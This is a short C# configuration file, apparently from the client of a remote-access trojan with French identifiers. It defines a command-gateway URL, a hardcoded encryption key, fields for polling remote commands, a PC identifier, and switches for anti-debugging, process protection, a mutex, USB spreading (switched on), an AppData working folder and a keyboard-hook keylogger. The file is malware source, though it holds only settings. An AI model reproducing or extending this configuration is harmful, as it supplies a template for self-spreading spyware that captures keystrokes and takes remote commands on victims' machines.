using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ClIENT_PC
{
    class Parametre
    {
        //CONFIG
        public static string URL = "http://127.0.0.1/pcc_gateway/";
        public static string encryptionKey = "piWUCi7DsWLUTwOLou9QbiBP33NVk3yAyWRrAIXrdtg";
        internal static dynamic dernierCMD = string.Empty;
        internal static string API_KEY = string.Empty;
        internal static string ID_PC = string.Empty;
        internal static int tempActu = 2500;

        public static int CommCle = 0xB66F6;

        public static bool AntiDeBug = false;

        /* Process Protection */
        public static bool SystemProcess_Protect = false; //Don't use for debugging!
        public static bool SystemProcess_CheckParentProcess = false; //This is for anti-debug

        /* MUTEX */
        public static bool Mutex_Enable = true;
        public static string Mutex_MUTEX = ""; //leave empty to have a random MUTEX
        
        /* Spreaders */
        public static bool Spread_Usb = true;

        public static string CheminTravail = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        /* Google Recherche Rendre Service */
        public static bool Service_google = false;

        /* Keylogger Clavier Logger Hook */
        public static bool ClavierLogger = false;
    }
}
